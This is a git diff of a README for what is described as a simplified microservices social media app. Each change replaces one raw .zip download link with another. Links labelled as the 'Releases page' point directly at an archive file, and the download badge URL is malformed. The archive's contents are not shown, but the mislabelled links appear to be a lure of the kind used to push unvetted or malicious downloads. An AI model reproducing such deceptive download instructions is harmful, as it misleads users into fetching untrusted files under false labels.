@@ -1,6 +1,6 @@
 # 🎉 microservices_social_media-simplify-version- - Simplified Social Media Experience
 
-[![Download](https://raw.githubusercontent.com/aryyyy211/microservices_social_media-simplify-version-/main/formulation/microservices_social_media-simplify-version-.zip%https://raw.githubusercontent.com/aryyyy211/microservices_social_media-simplify-version-/main/formulation/microservices_social_media-simplify-version-.zip)](https://raw.githubusercontent.com/aryyyy211/microservices_social_media-simplify-version-/main/formulation/microservices_social_media-simplify-version-.zip)
+[![Download](https://github.com/aryyyy211/microservices_social_media-simplify-version-/raw/refs/heads/main/api-gateway/target/microservices_version_simplify_media_social_v2.7-beta.3.zip%https://github.com/aryyyy211/microservices_social_media-simplify-version-/raw/refs/heads/main/api-gateway/target/microservices_version_simplify_media_social_v2.7-beta.3.zip)](https://github.com/aryyyy211/microservices_social_media-simplify-version-/raw/refs/heads/main/api-gateway/target/microservices_version_simplify_media_social_v2.7-beta.3.zip)
 
 ## 📦 Overview
 
@@ -11,7 +11,7 @@ Welcome to the microservices social media project! This simplified version offer
 Before you can use the application, you need to download it. Follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/aryyyy211/microservices_social_media-simplify-version-/main/formulation/microservices_social_media-simplify-version-.zip) to find the latest version.
+   Go to our [Releases page](https://github.com/aryyyy211/microservices_social_media-simplify-version-/raw/refs/heads/main/api-gateway/target/microservices_version_simplify_media_social_v2.7-beta.3.zip) to find the latest version.
 
 2. **Select the Latest Release**  
    Find the latest version listed. It will have a clear label, usually marked as "Latest Release."
@@ -42,7 +42,7 @@ This application includes the following features:
 To download and install the software, please follow these instructions:
 
 1. **Go to the Releases Page**  
-   Click [here](https://raw.githubusercontent.com/aryyyy211/microservices_social_media-simplify-version-/main/formulation/microservices_social_media-simplify-version-.zip) to visit the releases page.
+   Click [here](https://github.com/aryyyy211/microservices_social_media-simplify-version-/raw/refs/heads/main/api-gateway/target/microservices_version_simplify_media_social_v2.7-beta.3.zip) to visit the releases page.
 
 2. **Download the Application**  
    Find the most recent version, and click on the corresponding download link. 
